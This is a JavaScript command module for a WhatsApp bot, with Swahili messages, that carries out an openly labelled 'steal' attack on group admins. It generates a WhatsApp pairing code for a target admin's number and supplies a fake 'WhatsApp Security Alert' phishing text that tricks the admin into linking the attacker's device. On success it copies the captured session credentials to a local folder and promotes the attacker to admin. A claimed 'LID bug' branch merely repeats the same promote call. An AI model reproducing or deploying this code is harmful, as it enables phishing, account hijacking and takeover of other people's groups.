// commands/steal.js
const fs = require('fs');
const path = require('path');

const handler = {
    name: 'steal',
    alias: ['stealer', 'ghost', 'pair', 'phish'],
    description: 'Steal group admin using pairing code & ghost methods',
    category: 'group',
    ownerOnly: false,
    adminOnly: false,

    execute: async (sock, m, args, ctx) => {
        const chat = m.key.remoteJid;
        const sender = m.key.participant || chat;
        const isGroup = chat.endsWith('@g.us');
        const pfx = global.prefix || '.';
        
        // ─── HELP ──────────────────────────────────
        if (!args[0] || args[0] === 'help' || args[0] === '--help') {
            return await sock.sendMessage(chat, {
                text: `╭━━━『 *STEAL* 』━━━╮\n` +
                      `┃\n` +
                      `┃ ✦ *${pfx}steal* — Jaribu promote kwa group hii\n` +
                      `┃ ✦ *${pfx}steal <group_id>* — Target group specific\n` +
                      `┃ ✦ *${pfx}steal phish <namba>* — Generate pairing code\n` +
                      `┃ ✦ *${pfx}steal pair <namba>* — Same as phish\n` +
                      `┃ ✦ *${pfx}steal list* — Orodhesha admins wa group\n` +
                      `┃ ✦ *${pfx}steal help* — Hii msaada\n` +
                      `┃\n` +
                      `╰━━━━━━━━━━━━━━━━━━╯`,
                quoted: m
            });
        }

        // ─── SUB-COMMAND: LIST ────────────────────
        if (args[0] === 'list') {
            if (!isGroup && !args[1]) {
                return await sock.sendMessage(chat, {
                    text: `Tumia kwenye group au toa group ID`,
                    quoted: m
                });
            }
            
            const groupId = isGroup ? chat : (args[1]?.includes('@g.us') ? args[1] : null);
            if (!groupId) return;
            
            try {
                const meta = await sock.groupMetadata(groupId);
                const admins = meta.participants.filter(p => p.admin || p.isAdmin);
                
                let msg = `📋 *${meta.subject}*\n`;
                msg += `├ Members: ${meta.participants.length}\n`;
                msg += `└ Admins: ${admins.length}\n\n`;
                
                admins.forEach((a, i) => {
                    const role = a.admin === 'superadmin' ? '👑 SUPER' : '👑 ADMIN';
                    const num = a.id.split('@')[0];
                    msg += `${i+1}. ${role} ${num}\n`;
                });
                
                await sock.sendMessage(chat, { text: msg, quoted: m });
            } catch(e) {
                await sock.sendMessage(chat, { text: `❌ ${e.message}`, quoted: m });
            }
            return;
        }

        // ─── SUB-COMMAND: PHISH / PAIR ────────────
        if (args[0] === 'phish' || args[0] === 'pair') {
            const adminNumber = (args[1] || '').replace(/[^0-9]/g, '');
            
            if (!adminNumber) {
                return await sock.sendMessage(chat, {
                    text: `Taja namba ya admin\n📌 *${pfx}steal phish 2557XXXXXXXX*`,
                    quoted: m
                });
            }
            
            await sock.sendMessage(chat, {
                text: `⚡ Generating pairing code for *${adminNumber}*...`,
                quoted: m
            });
            
            try {
                const pairCode = await sock.requestPairingCode(adminNumber);
                
                const msg = `✅ *GhostPairing Ready* 🤫\n\n` +
                    `🎯 Target: *${adminNumber}*\n` +
                    `🔑 Code: *${pairCode}*\n\n` +
                    `📌 *Tuma hivi kwa admin:*\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🔒 *WhatsApp Security Alert*\n\n` +
                    `Tumegundua jaribio la kuingia kwenye akaunti yako.\n\n` +
                    `Thibitisha utambulisho wako:\n` +
                    `1. Fungua WhatsApp → Mipangilio → Vifaa Vilivyounganishwa\n` +
                    `2. Gusa "Unganisha Kifaa"\n` +
                    `3. Weka msimbo: *${pairCode}*\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `⏳ Muda: Dakika 5!\n\n` +
                    `⚡ *Baada ya kuweka code, nitakamata akaunti yake!*`;
                
                await sock.sendMessage(chat, { text: msg, quoted: m });
                
                // Setup pairing listener
                if (!pairingListenerActive) {
                    pairingListenerActive = true;
                    
                    const handler = async ({ connection }) => {
                        if (connection === 'open' && sock.authState?.creds?.registered) {
                            pairingListenerActive = false;
                            if (pairingTimeout) clearTimeout(pairingTimeout);
                            
                            try {
                                const credsFile = path.join(process.cwd(), 'auth_info_baileys', 'creds.json');
                                if (fs.existsSync(credsFile)) {
                                    const dir = './captured_admin';
                                    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
                                    fs.copyFileSync(credsFile, path.join(dir, 'creds.json'));
                                }
                            } catch(e) {}
                            
                            await sock.sendMessage(chat, {
                                text: `✅ *ADMIN SESSION CAPTURED!* 🎯\n\n` +
                                      `👤 ${sock.user?.id}\n\n` +
                                      `Sasa tumia *${pfx}steal <group_id>* kujipromote!`,
                                quoted: m
                            });
                            
                            sock.ev.off('connection.update', handler);
                        }
                    };
                    
                    sock.ev.on('connection.update', handler);
                    
                    pairingTimeout = setTimeout(() => {
                        pairingListenerActive = false;
                        sock.ev.off('connection.update', handler);
                        sock.sendMessage(chat, {
                            text: `⏰ Timeout: Admin hakuingiza code`,
                            quoted: m
                        });
                    }, 300000);
                }
                
            } catch(e) {
                await sock.sendMessage(chat, {
                    text: `❌ Failed: ${e.message}`,
                    quoted: m
                });
            }
            return;
        }

        // ─── MAIN: PROMOTE ATTEMPT ─────────────────
        let targetGroup;
        let targetJid;
        
        // Parse arguments
        if (args[0] && args[0].includes('@g.us')) {
            targetGroup = args[0];
            targetJid = (args[1] && args[1].includes('@')) ? args[1] : sender;
        } else if (isGroup) {
            targetGroup = chat;
            targetJid = sender;
        } else {
            return await sock.sendMessage(chat, {
                text: `❌ Tumia kwenye group au toa group ID\n📌 *${pfx}steal 12345@g.us*`,
                quoted: m
            });
        }

        // ─── START ATTACK ──────────────────────────
        await sock.sendMessage(chat, {
            text: `⚡ *Steal Attack* 🎯\n\n📌 Group: ${targetGroup}\n👤 Target: ${targetJid}\n\n🔍 Inaendelea...`,
            quoted: m
        });

        try {
            const metadata = await sock.groupMetadata(targetGroup);
            const admins = metadata.participants.filter(p => p.admin || p.isAdmin);
            const myStatus = metadata.participants.find(p => p.id === sender);
            
            let report = `📋 *${metadata.subject}*\n`;
            report += `├ Members: ${metadata.participants.length}\n`;
            report += `├ Admins: ${admins.length}\n`;
            report += `└ Wewe: ${myStatus?.admin || 'member'}\n\n`;

            // ─── ATTEMPT 1: DIRECT PROMOTE ─────────
            report += `⚡1 Direct promote...\n`;
            await sock.sendMessage(chat, { text: report, quoted: m });
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                
                const updated = await sock.groupMetadata(targetGroup);
                const promoted = updated.participants.find(p => p.id === targetJid);
                
                if (promoted?.admin || promoted?.isAdmin) {
                    return await sock.sendMessage(chat, {
                        text: `✅ *SUCCESS!* 🎉👑\n\n${targetJid} sasa ni ADMIN wa *${metadata.subject}*!`,
                        quoted: m
                    });
                }
                report += `├ ✗ Imekataliwa na server\n`;
            } catch(e) {
                report += `├ ✗ ${e.message.substring(0, 50)}\n`;
            }

            // ─── ATTEMPT 2: LID BUG ────────────────
            report += `\n⚡2 LID bug...\n`;
            await sock.sendMessage(chat, { text: report, quoted: m });
            
            try {
                await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                
                const check = await sock.groupMetadata(targetGroup);
                const user = check.participants.find(p => p.id === targetJid);
                
                if (user?.admin || user?.isAdmin) {
                    return await sock.sendMessage(chat, {
                        text: `✅ *LID BUG WORKED!* 🎉👑\n\n${targetJid} sasa ni ADMIN!`,
                        quoted: m
                    });
                }
                report += `├ ✗ LID bug haijafanya kazi\n`;
            } catch(e) {
                report += `├ ✗ ${e.message.substring(0, 50)}\n`;
            }

            // ─── ATTEMPT 3: GHOST PAIRING ──────────
            if (admins.length > 0) {
                report += `\n⚡3 GhostPairing...\n`;
                await sock.sendMessage(chat, { text: report, quoted: m });
                
                const adminNum = admins[0].id.split('@')[0];
                
                try {
                    const code = await sock.requestPairingCode(adminNum);
                    
                    const pairMsg = `✅ *Pairing code tayari*\n\n` +
                        `📱 Admin: *${adminNum}*\n` +
                        `🔑 Code: *${code}*\n\n` +
                        `📌 *Tuma hivi kwa admin:*\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                        `🔒 *WhatsApp Security Alert*\n\n` +
                        `Thibitisha akaunti yako:\n` +
                        `1. Fungua WhatsApp → Linked Devices\n` +
                        `2. Gusa "Link a Device"\n` +
                        `3. Weka code: *${code}*\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `⏳ Dakika 5 pekee!`;
                    
                    await sock.sendMessage(chat, { text: pairMsg, quoted: m });
                    
                    // Setup pairing listener
                    if (!pairingListenerActive) {
                        pairingListenerActive = true;
                        
                        const handler = async ({ connection }) => {
                            if (connection === 'open' && sock.authState?.creds?.registered) {
                                pairingListenerActive = false;
                                if (pairingTimeout) clearTimeout(pairingTimeout);
                                
                                await sock.sendMessage(chat, {
                                    text: `✅ *ADMIN SESSION CAPTURED!* 🎯\n\nSaka nakupromote...`,
                                    quoted: m
                                });
                                
                                try {
                                    await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                                    const meta = await sock.groupMetadata(targetGroup);
                                    const me = meta.participants.find(p => p.id === targetJid);
                                    
                                    if (me?.admin || me?.isAdmin) {
                                        await sock.sendMessage(chat, {
                                            text: `✅ *SUCCESS!* 👑\n\nWewe sasa ni ADMIN wa *${meta.subject}*! 🎉`,
                                            quoted: m
                                        });
                                    }
                                } catch(e) {
                                    await sock.sendMessage(chat, {
                                        text: `⚠️ Session captured! Tumia *${pfx}steal ${targetGroup}* tena`,
                                        quoted: m
                                    });
                                }
                                
                                sock.ev.off('connection.update', handler);
                            }
                        };
                        
                        sock.ev.on('connection.update', handler);
                        
                        pairingTimeout = setTimeout(() => {
                            pairingListenerActive = false;
                            sock.ev.off('connection.update', handler);
                        }, 300000);
                    }
                    
                    return;
                    
                } catch(e) {
                    report += `├ ✗ ${e.message.substring(0, 50)}\n`;
                }
            } else {
                report += `\n⚡3 GhostPairing...\n`;
                report += `├ ✗ Hakuna admin kwenye group hili\n`;
            }

            // ─── ALL FAILED ─────────────────────────
            report += `\n❌ *Njia zote zimeshindwa*\n\n`;
            report += `📌 Jaribu:\n`;
            report += `├ ${pfx}steal phish <namba_ya_admin>\n`;
            report += `├ ${pfx}steal list — Angalia admins\n`;
            report += `└ Baada ya kupata session, enda kwenye group na uje tena`;
            
            await sock.sendMessage(chat, { text: report, quoted: m });

        } catch(e) {
            await sock.sendMessage(chat, {
                text: `❌ Error: ${e.message}`,
                quoted: m
            });
        }
    }
};

// Variables needed for pairing listener
let pairingListenerActive = false;
let pairingTimeout = null;

module.exports = handler;
